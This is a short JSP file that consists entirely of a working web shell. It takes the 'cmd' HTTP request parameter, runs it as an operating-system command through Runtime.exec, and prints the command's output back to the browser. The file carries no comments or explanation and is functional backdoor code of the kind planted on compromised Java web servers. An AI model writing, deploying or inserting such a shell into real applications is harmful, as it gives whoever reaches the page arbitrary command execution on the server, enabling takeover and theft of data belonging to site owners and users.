<%@ page import="java.io.*" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" pageEncoding="UTF-8" %>

<%
    String cmd = request.getParameter("cmd");
    Process pc = Runtime.getRuntime().exec(cmd);
    InputStream in =pc.getInputStream();
    InputStreamReader  isr = new InputStreamReader(in);
    BufferedReader br = new BufferedReader(isr);

    StringBuilder a=new StringBuilder("");
    String s=null;
    while((s=br.readLine())!=null){
        a.append(s+"\n");
    }

    response.getWriter().println("<pre>");
    response.getWriter().println(a);
    response.getWriter().println("</pre>");

%>